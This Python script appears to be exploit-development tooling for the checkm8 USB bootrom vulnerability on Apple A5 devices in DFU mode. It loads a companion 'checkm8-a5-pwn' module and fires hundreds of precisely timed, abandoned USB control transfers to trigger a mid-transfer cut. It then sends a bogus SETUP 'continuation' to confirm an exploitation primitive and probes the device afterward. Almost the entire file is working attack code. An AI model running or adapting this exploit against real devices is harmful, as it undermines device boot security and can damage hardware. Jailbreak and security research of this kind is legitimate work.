#!/usr/bin/env python3
"""Hunt the mid-data cut, then witness the A5 state with a continuation.

Loop: fire solo abandon-cut shots across the hot zone [430..660]us,
round-robin 5us steps. On the first shot that lands a MID-DATA CUT
(0 < actual < 128), IMMEDIATELY (same process, same handle, ~ms) send
the bogus continuation (0x00/0x00 SETUP, wLength 0x40, 64 bytes data):
- the earlier-session remainder class: bogus SETUP data is ACKed as a
  CONTINUATION of the pending phase if the A5 io_globals still hold
  the cut phase (rc=0 COMPLETION = stage-2 primitive ALIVE).
Afterwards: serve health probes.
"""
import ctypes
import fcntl
import glob
import os
import time

import importlib.util

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "dayone", os.path.join(HERE, "checkm8-a5-pwn.py"))
d = importlib.util.module_from_spec(spec)
spec.loader.exec_module(d)


def serve_probe(timeout=400):
    class Ctl(ctypes.Structure):
        _fields_ = [('r', ctypes.c_ubyte), ('b', ctypes.c_ubyte),
                    ('w', ctypes.c_ushort), ('i', ctypes.c_ushort),
                    ('l', ctypes.c_ushort), ('t', ctypes.c_uint),
                    ('d', ctypes.c_void_p)]
    for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
        try:
            if open(p).read().strip() != "1227":
                continue
        except OSError:
            continue
        n = os.path.dirname(p)
        bus = int(open(n + "/busnum").read())
        dev = int(open(n + "/devnum").read())
        fd = os.open("/dev/bus/usb/%03d/%03d" % (bus, dev), os.O_RDWR)
        buf = ctypes.create_string_buffer(255)
        ct = Ctl(0x80, 6, 0x0303, 0x0409, 255, timeout,
                 ctypes.cast(buf, ctypes.c_void_p))
        t0 = time.time()
        try:
            r = fcntl.ioctl(fd, 0xC0185500, ct)
            return "ret=%d %.1fms cpid=%s" % (
                r, (time.time() - t0) * 1000,
                "CPID" in buf.raw[:r].decode("utf-16le", "ignore"))
        except OSError as e:
            return "errno=%d %.1fms" % (e.errno, (time.time() - t0) * 1000)
        finally:
            os.close(fd)
    return "GONE"


def wait_dfu(timeout=900):
    import glob as g
    t0 = time.time()
    if any(open(p).read().strip() == '1227'
           for p in g.glob('/sys/bus/usb/devices/*/idProduct')
           if __import__('os').path.exists(p)):
        print("stale device attached - power-hold + dance NOW (waiting)")
        while any(open(p).read().strip() == '1227'
                  for p in g.glob('/sys/bus/usb/devices/*/idProduct')
                  if __import__('os').path.exists(p)):
            if time.time() - t0 > timeout:
                return False
            time.sleep(0.05)
        print("gone - do the dance")
    while time.time() - t0 < timeout:
        if any(open(p).read().strip() == '1227'
               for p in g.glob('/sys/bus/usb/devices/*/idProduct')
               if __import__('os').path.exists(p)):
            return True
        time.sleep(0.05)
    return False


def main():
    if not wait_dfu():
        print("no DFU entry")
        return 1
    time.sleep(0.8)
    usb = d.LibUSB()
    dev, handle, desc, _ = d.acquire(usb, want_serial=False)
    print("armed; live=%s" % serve_probe())

    zone = [430, 445, 460, 475, 490, 505, 520, 535, 550, 565, 580,
            595, 610, 625, 640, 655, 500, 500, 500]
    hit = None
    for shot in range(900):
        t = zone[shot % len(zone)]
        try:
            rc, info = usb.raw_ctrl(handle, 0x80, 6, (3 << 8) | 3, 0x040A,
                                    0x80, b'', abandon=True, cancel_at=0x40,
                                    abandon_timeout_ms=t / 1000.0,
                                    timeout_ms=500, name='hunt%d' % shot)
        except SystemExit as e:
            print("shot%d t=%d HANG (%s)" % (shot, t, e))
            try:
                usb.release(handle)
            except Exception:
                pass
            time.sleep(1.0)
            try:
                dev, handle, desc, _ = d.acquire(usb, want_serial=False)
            except Exception:
                print("reacquire failed - stop")
                return 1
            continue
        status, actual, cancel_rc, elapsed = info
        if 0 < actual < 128:
            print("shot%d t=%d: MID-DATA CUT actual=%d elapsed=%dus"
                  % (shot, t, actual, elapsed))
            # WITNESS - fire the continuation immediately
            t0 = time.perf_counter()
            try:
                rc2, info2 = usb.raw_ctrl(handle, 0x00, 0x00, 0, 0, 0x40,
                                         b'C' * 64, abandon=False,
                                         timeout_ms=600,
                                         name='continuation')
                s2, a2 = info2[0], info2[1]
                lag = (time.perf_counter() - t0) * 1000
                verdict = "CONTINUATION ACKED" if rc2 == 0 and s2 == 0 else \
                          "abnormal %s" % d.STATUS_NAMES.get(s2, s2)
                print("CONTINUATION: status=%s actual=%d lag=%.1fms << %s"
                      % (d.STATUS_NAMES.get(s2, s2), a2, lag, verdict))
            except SystemExit as e:
                print("CONTINUATION: HANG (%s)" % e)
            for probe in range(3):
                time.sleep(0.6)
                print("  post%.1fs: %s" % (0.6 * (probe + 1), serve_probe()))
            hit = (t, actual)
            break
        if shot % 50 == 49:
            print("  ..%d shots, last %s actual=%d" % (shot + 1, d.STATUS_NAMES[status], actual), flush=True)
        time.sleep(0.012)
    if not hit:
        print("no cut landed in 140 shots")
    return 0


if __name__ == "__main__":
    main()
